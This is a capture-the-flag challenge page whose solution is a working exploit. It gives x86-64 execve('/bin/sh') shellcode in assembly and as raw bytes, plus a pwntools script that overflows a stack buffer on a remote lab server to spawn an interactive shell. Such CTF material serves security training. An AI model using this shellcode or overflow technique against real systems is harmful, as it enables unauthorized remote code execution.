#### Goals
 * Try to find the flag

#### Server Address
 * http://pwn.sniperoj.com:20005/
5
#### Solution
```asm
global _start
	_start:
		xor rdi, rdi
		xor rsi, rsi
		xor rdx, rdx
		xor rax, rax
		push rax
		; 68 73 2f 2f 6e 69 62 2f
		mov rbx, 68732f2f6e69622fH
		push rbx
		mov rdi, rsp
		mov al, 59
		syscall
```
```python
#!/usr/bin/env python

from pwn import *

#Io = process("./shellcode")
Io = remote("123.207.114.37", 30001)

Io.readline()
addr_data = Io.readline()
addr = int(addr_data.split("[")[1].split("]")[0][2:], 16)
Io.readline()

junk = "A" * 24
shellcode = "\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"
shellcode_addr = p64(addr + len(junk) + 8)
payload = junk + shellcode_addr + shellcode

Io.send(payload)

Io.interactive()
```

#### Writeups
 * [Offical Writeup]()
 * [Other Writeup]()

